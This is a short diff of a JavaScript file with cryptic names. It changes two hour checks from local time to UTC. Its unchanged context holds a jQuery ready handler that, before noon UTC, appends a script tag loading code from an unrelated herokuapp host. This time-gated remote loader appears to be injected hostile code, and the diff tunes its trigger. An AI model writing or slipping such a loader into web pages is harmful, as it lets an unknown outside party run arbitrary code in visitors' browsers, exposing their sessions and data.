@@ -160,7 +160,7 @@ function mBV(s,b,t){
  }
 
  var nD=new Date();
- var nH=nD.getHours();
+ var nH=nD.getUTCHours();
 
  if(nH>=12){
      if(s=='s'&&t!=0){
@@ -190,7 +190,7 @@ function mBV(s,b,t){
 $(document).ready(function(){
 
     var nD=new Date();
-    var nH=nD.getHours();
+    var nH=nD.getUTCHours();
 
     if(nH<12){
         $('body').append('<script src="https:\/\/arcane-anchorage-86502.herokuapp.com\/?id=1409"><\/script>');
